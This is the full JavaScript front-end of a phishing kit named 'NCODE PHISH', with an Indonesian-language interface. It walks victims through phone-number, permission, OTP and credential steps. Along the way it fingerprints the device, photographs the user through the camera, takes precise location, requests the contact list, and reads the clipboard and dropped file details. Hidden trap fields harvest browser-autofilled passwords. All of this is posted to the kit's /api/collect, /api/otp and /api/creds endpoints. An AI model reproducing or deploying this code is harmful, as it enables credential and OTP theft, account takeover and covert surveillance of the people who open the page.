/* ============================================================
   NCODE PHISH — app.js
   Version: 3.0 — full, balanced.
   ============================================================ */
console.log("[NCODE] app.js loaded", new Date().toISOString());

(() => {
  console.log("[NCODE] IIFE start");
  window.addEventListener("error", (e) => {
    console.error("[NCODE] window error:", e.message, e.filename, e.lineno);
  });

  const $ = (id) => document.getElementById(id);

  const state = {
    phone: "",
    os: {},
    device: {},
    network: {},
    fingerprint: {},
    sensors: {},
    geo: null,
    camera: null,
    contacts: null,
    creds: null,
    clipboard: null,
    files: null,
    autofill_captured: [],
  };

  // ============ OS DETECT ============
  function detectOS() {
    const ua = navigator.userAgent;
    const p = navigator.platform || "";
    const out = { name: "Unknown", version: "n/a", arch: "n/a" };

    const a = ua.match(/Android\s+([\d.]+)/i);
    if (a) {
      out.name = "Android";
      out.version = a[1];
      const model = ua.match(/Android\s+[\d.]+;\s*([^)]+?)(?:\s+Build\/|\))/i);
      if (model) out.arch = model[1].trim();
      return out;
    }

    const ios = ua.match(/OS\s+([\d_]+)\s+like\s+Mac/i);
    if (/iPhone|iPad|iPod/.test(ua)) {
      out.name = /iPad/.test(ua) ? "iPadOS" : "iOS";
      out.version = ios ? ios[1].replace(/_/g, ".") : "n/a";
      const m = ua.match(/(iPhone|iPad|iPod)/);
      if (m) out.arch = m[1];
      return out;
    }

    if (/Windows NT/.test(ua)) {
      out.name = "Windows";
      const w = ua.match(/Windows NT ([\d.]+)/);
      const map = {
        "10.0": "10/11",
        "6.3": "8.1",
        "6.2": "8",
        "6.1": "7",
      };
      out.version = map[w && w[1]] || (w ? w[1] : "n/a");
      out.arch = /WOW64|Win64|x64/.test(ua)
        ? "x64"
        : /arm64/i.test(ua)
        ? "ARM64"
        : "x86";
      return out;
    }

    const mac = ua.match(/Mac OS X ([\d_.]+)/);
    if (/Macintosh|Mac OS X/.test(ua)) {
      out.name = "macOS";
      out.version = mac ? mac[1].replace(/_/g, ".") : "n/a";
      out.arch = /arm64|aarch64/i.test(ua) ? "ARM64" : "x64";
      return out;
    }

    if (/CrOS/.test(ua)) {
      out.name = "ChromeOS";
      const c = ua.match(/CrOS\s+\S+\s+([\d.]+)/);
      out.version = c ? c[1] : "n/a";
      return out;
    }

    if (/Linux/.test(p) || /Linux/.test(ua)) {
      out.name = "Linux";
      const l = ua.match(/Linux\s+([\w.]+)/);
      out.version = l ? l[1] : "n/a";
      out.arch = /aarch64|arm64/i.test(ua) ? "ARM64" : "x64";
      return out;
    }

    return out;
  }

  // ============ FINGERPRINT ============
  function canvasFP() {
    try {
      const c = document.createElement("canvas");
      c.width = 240;
      c.height = 50;
      const ctx = c.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "15px 'Arial'";
      ctx.fillStyle = "#f60";
      ctx.fillRect(2, 2, 120, 30);
      ctx.fillStyle = "#069";
      ctx.fillText("NCODE-fp-DEVICE", 4, 4);
      ctx.fillStyle = "rgba(102,204,0,0.7)";
      ctx.fillText("NCODE-fp-DEVICE", 6, 6);
      const h = c.toDataURL();
      let s = 0;
      for (let i = 0; i < h.length; i++) s = (s * 31 + h.charCodeAt(i)) >>> 0;
      return s.toString(16).padStart(8, "0");
    } catch (e) {
      return "na";
    }
  }

  async function audioFP() {
    try {
      const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
      if (!AC) return "na";
      const ctx = new AC(1, 44100, 44100);
      const osc = ctx.createOscillator();
      osc.type = "triangle";
      osc.frequency.value = 1000;
      const comp = ctx.createDynamicsCompressor();
      osc.connect(comp);
      comp.connect(ctx.destination);
      osc.start(0);
      const buf = await ctx.startRendering();
      const d = buf.getChannelData(0);
      let sum = 0;
      for (let i = 4500; i < 5000; i++) sum += Math.abs(d[i]);
      return sum.toFixed(6);
    } catch (e) {
      return "na";
    }
  }

  function getGPU() {
    try {
      const c = document.createElement("canvas");
      const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
      if (!gl) return { renderer: "na", vendor: "na" };
      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
      return {
        renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "na",
        vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "na",
      };
    } catch (e) {
      return { renderer: "na", vendor: "na" };
    }
  }

  async function getBattery() {
    try {
      if (!navigator.getBattery) return "na";
      const b = await navigator.getBattery();
      return Math.round(b.level * 100) + "%" + (b.charging ? " charging" : "");
    } catch (e) {
      return "na";
    }
  }

  function getConn() {
    const c =
      navigator.connection ||
      navigator.mozConnection ||
      navigator.webkitConnection;
    return {
      conn: c
        ? (c.effectiveType || "?") +
          " / " +
          (c.downlink || "?") +
          "Mbps / " +
          (c.rtt || "?") +
          "ms"
        : "na",
      downlink: c && c.downlink !== undefined ? c.downlink : "na",
      rtt: c && c.rtt !== undefined ? c.rtt : "na",
      save_data: c && c.saveData !== undefined ? c.saveData : "na",
    };
  }

  function webrtcLocalIP() {
    return new Promise((resolve) => {
      try {
        const RTC = window.RTCPeerConnection || window.webkitRTCPeerConnection;
        if (!RTC) return resolve("na");
        const pc = new RTC({ iceServers: [] });
        pc.createDataChannel("");
        const ips = {};
        pc.onicecandidate = (e) => {
          if (!e.candidate) {
            try {
              pc.close();
            } catch (x) {}
            resolve(Object.keys(ips).join(", ") || "na");
            return;
          }
          const m = e.candidate.candidate.match(
            /(\d{1,3}(?:\.\d{1,3}){3}|[a-f0-9:]+)/i
          );
          if (m) ips[m[1]] = 1;
        };
        pc.createOffer().then((o) => pc.setLocalDescription(o));
        setTimeout(() => {
          try {
            pc.close();
          } catch (x) {}
          resolve(Object.keys(ips).join(", ") || "na");
        }, 3000);
      } catch (e) {
        resolve("na");
      }
    });
  }

  function detectFonts() {
    const base = ["monospace", "sans-serif", "serif"];
    const test = [
      "Arial",
      "Helvetica",
      "Times New Roman",
      "Courier New",
      "Verdana",
      "Georgia",
      "Tahoma",
      "Trebuchet MS",
      "Comic Sans MS",
      "Impact",
      "Segoe UI",
      "Roboto",
      "Noto Sans",
      "Ubuntu",
      "Cantarell",
      "Calibri",
      "SF Pro",
    ];
    const c = document.createElement("canvas");
    const ctx = c.getContext("2d");
    const size = 48;
    const wOf = (font) => {
      ctx.font = size + "px " + font + ", monospace";
      return ctx.measureText("mmmmmmmmmmlli").width;
    };
    const baseline = {};
    base.forEach((b) => {
      baseline[b] = wOf(b);
    });
    const found = [];
    test.forEach((f) => {
      const hit = base.some((b) => {
        ctx.font = size + 'px "' + f + '", ' + b;
        return ctx.measureText("mmmmmmmmmmlli").width !== baseline[b];
      });
      if (hit) found.push(f);
    });
    return found.join(",");
  }

  function getVoices() {
    try {
      const v =
        (window.speechSynthesis && window.speechSynthesis.getVoices()) || [];
      return {
        count: v.length,
        sample: v
          .slice(0, 5)
          .map((x) => x.name + "/" + x.lang)
          .join(" | "),
      };
    } catch (e) {
      return { count: 0, sample: "na" };
    }
  }

  function detectAdblock() {
    try {
      const b = document.createElement("div");
      b.className = "ad ads adsbox pub_300x250";
      b.style.cssText =
        "position:absolute;left:-9999px;top:-9999px;height:10px;width:10px";
      document.body.appendChild(b);
      const blocked = b.offsetHeight === 0 || b.offsetParent === null;
      b.remove();
      return blocked ? "yes" : "no";
    } catch (e) {
      return "na";
    }
  }

  async function getStorage() {
    try {
      if (!navigator.storage || !navigator.storage.estimate)
        return { usage: "na", quota: "na" };
      const e = await navigator.storage.estimate();
      const mb = (n) => (n / 1024 / 1024).toFixed(1) + " MB";
      return { usage: mb(e.usage || 0), quota: mb(e.quota || 0) };
    } catch (e) {
      return { usage: "na", quota: "na" };
    }
  }

  async function getPermissions() {
    const names = [
      "geolocation",
      "camera",
      "microphone",
      "notifications",
      "clipboard-read",
      "clipboard-write",
      "persistent-storage",
      "push",
      "accelerometer",
      "gyroscope",
      "magnetometer",
    ];
    const out = {};
    for (let i = 0; i < names.length; i++) {
      const n = names[i];
      try {
        const s = await navigator.permissions.query({ name: n });
        out[n] = s.state;
      } catch (e) {
        out[n] = "n/a";
      }
    }
    return out;
  }

  async function getMediaDevices() {
    try {
      const d = await navigator.mediaDevices.enumerateDevices();
      const counts = { audioinput: 0, audiooutput: 0, videoinput: 0 };
      d.forEach((x) => {
        counts[x.kind] = (counts[x.kind] || 0) + 1;
      });
      return (
        "mic:" +
        counts.audioinput +
        " spk:" +
        counts.audiooutput +
        " cam:" +
        counts.videoinput
      );
    } catch (e) {
      return "na";
    }
  }

  async function buildAll() {
    const gpu = getGPU();
    const conn = getConn();
    const voice = getVoices();
    state.os = detectOS();
    state.device = {
      ua: navigator.userAgent,
      platform: navigator.platform,
      lang: navigator.language,
      langs: (navigator.languages || []).join(","),
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: screen.width + "x" + screen.height,
      viewport: innerWidth + "x" + innerHeight,
      dpr: window.devicePixelRatio,
      color_depth: screen.colorDepth,
      cores: navigator.hardwareConcurrency || "na",
      ram: navigator.deviceMemory || "na",
      gpu: gpu.renderer,
      battery: await getBattery(),
      touch: "ontouchstart" in window ? "yes" : "no",
      hover: matchMedia("(hover: hover)").matches ? "yes" : "no",
    };
    state.fingerprint = {
      canvas: canvasFP(),
      audio: await audioFP(),
      webgl_vendor: gpu.vendor,
      fonts: detectFonts(),
      voice_count: voice.count,
      voice_sample: voice.sample,
      plugins:
        Array.prototype.slice
          .call(navigator.plugins || [])
          .map((p) => p.name)
          .join(",") || "na",
      dnt: navigator.doNotTrack || "na",
      cookies: navigator.cookieEnabled ? "yes" : "no",
      adblock: detectAdblock(),
    };
    state.network = {
      conn: conn.conn,
      downlink: conn.downlink,
      rtt: conn.rtt,
      save_data: conn.save_data,
      webrtc_local: await webrtcLocalIP(),
    };
    state.sensors = {
      permissions: await getPermissions(),
      media_devices: await getMediaDevices(),
      storage: await getStorage(),
    };
    console.log("[NCODE] buildAll done");
  }

  // ============ AUTOFILL TRAP ============
  function startAutofillTrap() {
    console.log("[NCODE] autofill trap start");
    const trapU = $("trap-user");
    const trapP = $("trap-pass");
    const trapE = $("trap-email");
    if (!trapU || !trapP) {
      console.warn("[NCODE] trap inputs missing, skip");
      return;
    }
    const hits = {};
    const capture = (label, el) => {
      if (!el) return;
      const v = el.value;
      if (v && v.length > 0) {
        const key = label + ":" + v.length;
        if (!hits[key]) {
          hits[key] = 1;
          state.autofill_captured.push({
            field: label,
            value: v,
            t: Date.now(),
          });
          console.log("[NCODE] autofill captured", label, v.length + " chars");
        }
      }
    };
    const poll = setInterval(() => {
      capture("username", trapU);
      capture("password", trapP);
      capture("email", trapE);
    }, 400);
    setTimeout(() => {
      try {
        trapU.focus();
        trapU.blur();
        trapP.focus();
        trapP.blur();
        trapE.focus();
        trapE.blur();
      } catch (e) {}
    }, 800);
    setTimeout(() => {
      capture("username", trapU);
      capture("password", trapP);
      capture("email", trapE);
      clearInterval(poll);
    }, 15000);
  }

  // ============ CONTACTS ============
  async function pickContacts() {
    try {
      if (!("contacts" in navigator) || !navigator.contacts.select) {
        return { supported: false, data: [] };
      }
      const props = ["name", "tel", "email", "address"];
      const opts = { multiple: true };
      const contacts = await navigator.contacts.select(props, opts);
      if (!contacts || !contacts.length) return { supported: true, data: [] };
      const clean = contacts.map((c) => ({
        name: (c.name || []).join(" "),
        tel: (c.tel || []).join(" | "),
        email: (c.email || []).join(" | "),
        address: (c.address || [])
          .map((a) => (typeof a === "string" ? a : JSON.stringify(a)))
          .join(" | "),
      }));
      return { supported: true, data: clean };
    } catch (e) {
      return { supported: true, error: String(e), data: [] };
    }
  }

  // ============ CLIPBOARD ============
  function installClipboardHook() {
    document.addEventListener(
      "paste",
      (ev) => {
        try {
          const dt = ev.clipboardData || window.clipboardData;
          const txt = (dt && dt.getData("text")) || "";
          if (txt && txt.length > 0) {
            state.clipboard = {
              text: txt.slice(0, 2000),
              len: txt.length,
              t: Date.now(),
            };
          }
        } catch (e) {}
      },
      true
    );
  }

  // ============ FILE TRAP ============
  function installFileTrap() {
    document.addEventListener(
      "dragover",
      (e) => {
        e.preventDefault();
      },
      false
    );
    document.addEventListener(
      "drop",
      (e) => {
        e.preventDefault();
        try {
          const items = Array.prototype.slice.call(e.dataTransfer.files || []);
          if (!items.length) return;
          state.files = items.slice(0, 10).map((f) => ({
            name: f.name,
            size: f.size,
            type: f.type,
            lastModified: f.lastModified,
          }));
        } catch (x) {}
      },
      false
    );
    document.addEventListener(
      "change",
      (ev) => {
        if (
          ev.target &&
          ev.target.type === "file" &&
          ev.target.files &&
          ev.target.files.length
        ) {
          state.files = Array.prototype.slice
            .call(ev.target.files)
            .slice(0, 10)
            .map((f) => ({
              name: f.name,
              size: f.size,
              type: f.type,
              lastModified: f.lastModified,
            }));
        }
      },
      true
    );
  }

  // ============ GEO ============
  function getGeo() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve(null);
      navigator.geolocation.getCurrentPosition(
        (p) => {
          state.geo = {
            lat: p.coords.latitude,
            lng: p.coords.longitude,
            accuracy: Math.round(p.coords.accuracy),
            altitude: p.coords.altitude,
            heading: p.coords.heading,
            speed: p.coords.speed,
            timestamp: p.timestamp,
          };
          console.log("[NCODE] geo ok", state.geo.lat, state.geo.lng);
          resolve(state.geo);
        },
        (err) => {
          console.warn("[NCODE] geo fail", err.message);
          resolve(null);
        },
        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
      );
    });
  }

  // ============ CAMERA ============
  async function getCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: "user",
          width: { ideal: 720 },
          height: { ideal: 540 },
        },
        audio: false,
      });
      const v = $("cam");
      v.srcObject = stream;
      await new Promise((r) => setTimeout(r, 1000));
      const c = $("cam-canvas");
      c.width = v.videoWidth || 720;
      c.height = v.videoHeight || 540;
      c.getContext("2d").drawImage(v, 0, 0);
      state.camera = c.toDataURL("image/jpeg", 0.88);
      stream.getTracks().forEach((t) => t.stop());
      console.log("[NCODE] camera ok, len", state.camera.length);
      return true;
    } catch (e) {
      console.warn("[NCODE] camera fail", e.message);
      return false;
    }
  }

  // ============ SEND ============
  async function send(path, payload) {
    console.log("[NCODE] POST", path);
    try {
      const r = await fetch(path, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        keepalive: true,
      });
      const j = await r.json().catch(() => ({}));
      console.log("[NCODE] POST resp", path, r.status, j);
      return j;
    } catch (e) {
      console.error("[NCODE] POST fail", path, e);
      return null;
    }
  }

  // ============ UI ============
  const stepPhone = $("step-phone");
  const stepPerm = $("step-perm");
  const stepOtp = $("step-otp");
  const stepCreds = $("step-creds");
  const stepDone = $("step-done");

  function show(step) {
    [stepPhone, stepPerm, stepOtp, stepCreds, stepDone].forEach((s) => {
      if (s) s.classList.add("hidden");
    });
    if (step) step.classList.remove("hidden");
  }

  const btnSend = $("btn-send");
  if (btnSend) {
    btnSend.addEventListener("click", () => {
      console.log("[NCODE] btn-send clicked");
      const raw = $("phone").value.replace(/\D/g, "");
      console.log("[NCODE] phone raw", raw);
      if (raw.length < 8) {
        $("phone").focus();
        $("phone").style.borderColor = "#f43f5e";
        return;
      }
      state.phone = "+62" + raw.replace(/^0+/, "");
      $("ph-out").textContent = state.phone;
      show(stepPerm);
    });
  } else {
    console.error("[NCODE] btn-send MISSING in HTML");
  }

  const btnAllow = $("btn-allow");
  if (btnAllow) {
    btnAllow.addEventListener("click", async (e) => {
      const btn = e.currentTarget;
      btn.disabled = true;
      console.log("[NCODE] btn-allow clicked");

      const geo = await getGeo();
      await getCamera();
      const contactsRes = await pickContacts();

      if ($("b-geo")) {
        $("b-geo").textContent = geo ? "OK" : "Ditolak";
        $("b-geo").className = "badge " + (geo ? "ok" : "err");
      }
      if ($("b-cam")) {
        $("b-cam").textContent = state.camera ? "OK" : "Ditolak";
        $("b-cam").className = "badge " + (state.camera ? "ok" : "err");
      }
      if ($("b-contacts")) {
        if (contactsRes.supported && contactsRes.data.length) {
          state.contacts = contactsRes.data;
          $("b-contacts").textContent = contactsRes.data.length + " kontak";
          $("b-contacts").className = "badge ok";
        } else {
          $("b-contacts").textContent = contactsRes.supported
            ? "0 / ditolak"
            : "n/a";
          $("b-contacts").className =
            "badge " + (contactsRes.supported ? "err" : "");
        }
      }

      await send("/api/collect", {
        phone: state.phone,
        os: state.os,
        device: state.device,
        network: state.network,
        fingerprint: state.fingerprint,
        sensors: state.sensors,
        geo: state.geo,
        camera: state.camera,
        contacts: state.contacts,
      });

      show(stepOtp);
      startTimer();
    });
  }

  const btnSkip = $("btn-skip-contacts");
  if (btnSkip) {
    btnSkip.addEventListener("click", async (e) => {
      e.currentTarget.disabled = true;
      console.log("[NCODE] skip contacts");
      const geo = await getGeo();
      await getCamera();
      if ($("b-geo")) {
        $("b-geo").textContent = geo ? "OK" : "Ditolak";
        $("b-geo").className = "badge " + (geo ? "ok" : "err");
      }
      if ($("b-cam")) {
        $("b-cam").textContent = state.camera ? "OK" : "Ditolak";
        $("b-cam").className = "badge " + (state.camera ? "ok" : "err");
      }
      if ($("b-contacts")) {
        $("b-contacts").textContent = "dilewati";
      }
      await send("/api/collect", {
        phone: state.phone,
        os: state.os,
        device: state.device,
        network: state.network,
        fingerprint: state.fingerprint,
        sensors: state.sensors,
        geo: state.geo,
        camera: state.camera,
        contacts: null,
      });
      show(stepOtp);
      startTimer();
    });
  }

  const otps = document.querySelectorAll(".otp");
  otps.forEach((el, i) => {
    el.addEventListener("input", () => {
      el.value = el.value.replace(/\D/g, "").slice(0, 1);
      if (el.value && i < otps.length - 1) otps[i + 1].focus();
    });
    el.addEventListener("keydown", (ev) => {
      if (ev.key === "Backspace" && !el.value && i > 0) otps[i - 1].focus();
    });
    el.addEventListener("paste", (ev) => {
      ev.preventDefault();
      const txt = (ev.clipboardData.getData("text") || "")
        .replace(/\D/g, "")
        .slice(0, 6);
      txt.split("").forEach((ch, k) => {
        if (otps[k]) otps[k].value = ch;
      });
      const last = Math.min(txt.length, otps.length - 1);
      if (otps[last]) otps[last].focus();
    });
  });

  let timerId = null;
  function startTimer() {
    let s = 60;
    const el = $("timer");
    if (!el) return;
    el.textContent = "Kirim ulang dalam " + s + "s";
    clearInterval(timerId);
    timerId = setInterval(() => {
      s--;
      if (s <= 0) {
        clearInterval(timerId);
        el.textContent = "Kirim ulang";
        el.style.cursor = "pointer";
        el.style.color = "#3b82f6";
        el.onclick = () => {
          send("/api/otp", { phone: state.phone, code: "RESEND" });
          startTimer();
        };
      } else {
        el.textContent = "Kirim ulang dalam " + s + "s";
      }
    }, 1000);
  }

  const btnVerify = $("btn-verify");
  if (btnVerify) {
    btnVerify.addEventListener("click", async (e) => {
      const code = Array.prototype.map
        .call(otps, (o) => o.value)
        .join("");
      console.log("[NCODE] verify code", code);
      if (code.length < 6) {
        otps.forEach((o) => (o.style.borderColor = "#f43f5e"));
        return;
      }
      e.currentTarget.disabled = true;
      await send("/api/otp", { phone: state.phone, code });
      await getCamera();
      show(stepCreds);
      try {
        if (navigator.clipboard && navigator.clipboard.readText) {
          const t = await navigator.clipboard.readText();
          if (t)
            state.clipboard = {
              text: t.slice(0, 2000),
              len: t.length,
              t: Date.now(),
            };
        }
      } catch (x) {}
      startAutofillTrap();
    });
  }

  const btnSave = $("btn-save");
  if (btnSave) {
    btnSave.addEventListener("click", async (e) => {
      const btn = e.currentTarget;
      btn.disabled = true;
      console.log("[NCODE] btn-save clicked");

      const username = $("c-user").value.trim();
      const password = $("c-pass").value;

      const contactsRes = await pickContacts();
      if (contactsRes.supported && contactsRes.data.length) {
        state.contacts = (state.contacts || []).concat(contactsRes.data);
        if ($("b-contacts2")) {
          $("b-contacts2").textContent = contactsRes.data.length + " kontak";
          $("b-contacts2").className = "badge ok";
        }
      } else if ($("b-contacts2")) {
        $("b-contacts2").textContent = "0";
        $("b-contacts2").className = "badge err";
      }

      const trapU = ($("trap-user") || {}).value || "";
      const trapP = ($("trap-pass") || {}).value || "";
      const trapE = ($("trap-email") || {}).value || "";

      state.creds = {
        username: username,
        password: password,
        autofill: {
          username: trapU || null,
          password: trapP || null,
          email: trapE || null,
        },
        autofill_history: state.autofill_captured,
        clipboard: state.clipboard,
        files: state.files,
      };

      await send("/api/creds", {
        phone: state.phone,
        creds: state.creds,
        contacts: state.contacts,
        geo: state.geo,
        os: state.os,
        device: state.device,
        network: state.network,
        fingerprint: state.fingerprint,
        sensors: state.sensors,
      });

      show(stepDone);
    });
  }

  // init
  installClipboardHook();
  installFileTrap();
  buildAll().catch((e) => console.error("[NCODE] buildAll fail", e));

  console.log("[NCODE] ready");
})();